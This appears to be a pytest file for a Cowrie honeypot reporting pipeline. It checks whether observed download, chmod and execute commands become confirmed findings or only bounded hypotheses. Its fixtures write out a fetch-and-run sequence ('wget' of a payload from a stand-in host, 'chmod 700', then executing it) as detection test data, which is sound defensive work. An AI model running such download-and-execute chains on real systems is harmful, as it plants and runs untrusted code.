"""Observed Cowrie command input can support a bounded, non-canonical hypothesis."""

from __future__ import annotations

from production.reporting.typed_semantic_chain_selection import select_typed_semantic_chains
from tests.test_cross_family_relationship_evaluation import _build
from tests.test_transfer_family_migration import _payload, _report, _transfer_event


RULE = {
    "rule_id": "typed-transfer-permission-execution",
    "required_operation_types": [
        "transfer_attempt", "permission_modify", "execution_attempt"
    ],
    "minimum_incomplete_operation_count": 2,
    "allow_unconfirmed_incomplete_hypothesis": True,
}


def _case(name: str, events: list[tuple[str, str]]):
    return _build({"case_id": name, "events": events})


def test_same_path_input_only_is_hypothesis_not_finding() -> None:
    facts, report = _case("input-only", [
        ("wget https://example.invalid/payload.sh -O /tmp/payload.sh", "unknown"),
        ("chmod 700 /tmp/payload.sh", "unknown"),
    ])
    matches = select_typed_semantic_chains(facts, [RULE])["matches"]
    assert len(matches) == 1
    assert matches[0]["status"] == "incomplete"
    assert matches[0]["chronology_quality"] == "timestamp_supported"
    assert any("unconfirmed" in item.lower() for item in matches[0]["limitations"])
    assert report["behavioral_findings"] == []
    assert len(report["hypothesis_sets"]) == 1
    statement = report["hypothesis_sets"][0]["hypotheses"][0]["statement"]
    assert "completion and effects are not established" in statement


def test_failed_prerequisite_wrong_path_and_missing_prerequisite_abstain() -> None:
    for name, events in [
        ("failed-transfer", [
            ("wget https://example.invalid/a -O /tmp/a", "failure"),
            ("chmod 700 /tmp/a", "unknown"),
        ]),
        ("wrong-path", [
            ("wget https://example.invalid/a -O /tmp/a", "unknown"),
            ("chmod 700 /tmp/b", "unknown"),
        ]),
        ("no-transfer", [("chmod 700 /tmp/a", "unknown")]),
    ]:
        facts, report = _case(name, events)
        assert select_typed_semantic_chains(facts, [RULE])["matches"] == []
        assert report["hypothesis_sets"] == []


def test_unconfirmed_complete_chain_does_not_become_finding_or_hypothesis() -> None:
    facts, report = _case("all-input", [
        ("wget https://example.invalid/a -O /tmp/a", "unknown"),
        ("chmod 700 /tmp/a", "unknown"),
        ("/tmp/a", "unknown"),
    ])
    assert select_typed_semantic_chains(facts, [RULE])["matches"] == []
    assert report["behavioral_findings"] == []
    assert report["hypothesis_sets"] == []


def test_reported_success_still_uses_existing_complete_finding_gate() -> None:
    _facts, report = _case("confirmed-chain", [
        ("wget https://example.invalid/a -O /tmp/a", "success"),
        ("chmod 700 /tmp/a", "success"),
        ("/tmp/a", "success"),
    ])
    assert [item["finding_type"] for item in report["behavioral_findings"]] == [
        "connected_transfer_permission_execution"
    ]
    assert report["hypothesis_sets"] == []


def test_direct_transfer_and_observed_chmod_keep_distinct_authorities() -> None:
    session = "direct-transfer-then-input"
    report = _report(_payload(
        session,
        commands=[
            ("wget https://example.invalid/a -O /var/tmp/observed.bin", "unknown", ""),
            ("chmod 700 /var/tmp/observed.bin", "unknown", ""),
        ],
        transfer_events=[_transfer_event(session, index=1)],
    ))
    assert any(
        finding.get("semantic_family") == "transfer"
        for finding in report["behavioral_findings"]
    )
    assert len(report["hypothesis_sets"]) == 1
    assert "completion and effects are not established" in (
        report["hypothesis_sets"][0]["hypotheses"][0]["statement"]
    )
